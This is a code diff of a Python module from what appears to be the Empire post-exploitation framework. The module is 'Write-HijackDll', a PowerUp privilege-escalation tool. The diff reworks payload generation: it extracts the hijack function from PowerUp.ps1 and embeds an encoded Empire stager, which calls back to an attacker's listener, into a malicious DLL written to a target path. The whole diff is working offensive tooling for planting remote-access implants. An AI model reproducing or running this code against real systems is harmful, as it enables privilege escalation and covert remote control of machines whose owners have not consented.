@@ -5,7 +5,7 @@ class Module:
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'Write-DllHijacker',
+            'Name': 'Write-HijackDll',
 
             'Author': ['leechristensen (@tifkin_)', '@harmj0y'],
 
@@ -83,8 +83,10 @@ class Module:
 
     def generate(self):
 
-        # read in the common module source code
-        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/powerup/Write-HijackDll.ps1"
+        moduleName = self.info["Name"]
+        
+        # read in the common powerup.ps1 module source code
+        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/PowerUp.ps1"
 
         try:
             f = open(moduleSource, 'r')
@@ -95,33 +97,33 @@ class Module:
         moduleCode = f.read()
         f.close()
 
-        script = moduleCode
+        # get just the code needed for the specified function
+        script = helpers.generate_dynamic_powershell_script(moduleCode, moduleName)
 
+        script += moduleName + " "
 
-        hijackPath = self.options['HijackPath']['Value']
-        batPath = "\\".join(hijackPath.split("\\")[0:-1]) + "\debug.bat"
+        # extract all of our options
+        listenerName = self.options['Listener']['Value']
+        userAgent = self.options['UserAgent']['Value']
+        proxy = self.options['Proxy']['Value']
+        proxyCreds = self.options['ProxyCreds']['Value']
 
-        # generate the .bat launcher code to write out to the specified location
-        l = self.mainMenu.stagers.stagers['launcher_bat']
-        l.options['Listener']['Value'] = self.options['Listener']['Value']
-        l.options['UserAgent']['Value'] = self.options['UserAgent']['Value']
-        l.options['Proxy']['Value'] = self.options['Proxy']['Value']
-        l.options['ProxyCreds']['Value'] = self.options['ProxyCreds']['Value']
-        if self.options['Delete']['Value'].lower() == "true":
-            l.options['Delete']['Value'] = "True"
-        else:
-            l.options['Delete']['Value'] = "False"
-        launcherCode = l.generate()
-
-        # PowerShell code to write the launcher out
-        script += "\n$batCode = @\"\n" + launcherCode + "\"@\n"
-        script += "$batCode | Out-File -Encoding ASCII '"+batPath+"';\n"
-        script += "\"Launcher bat written to " + batPath + "`n\";\n"
-  
-        if launcherCode == "":
-            print helpers.color("[!] Error in launcher .bat generation.")
+        if not self.mainMenu.listeners.is_listener_empire(listenerName):
+            print helpers.color("[!] Empire listener required!")
             return ""
+
+        # generate the launcher code
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+
+        if launcher == "":
+            print helpers.color("[!] Error in launcher command generation.")
+            return ""
+
         else:
-            # script += "Write-HijackDll -HijackPath '"+hijackPath+"';"
-            script += "Write-HijackDll -OutputFile '"+str(hijackPath)+"' -BatPath '"+str(batPath)+"';"
-            return script
+            outFile = self.options['HijackPath']['Value']
+            script += " -Command \"%s\"" % (launcher)
+            script += " -OutputFile %s" % (outFile)
+
+        script += ' | Out-String | %{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'
+
+        return script
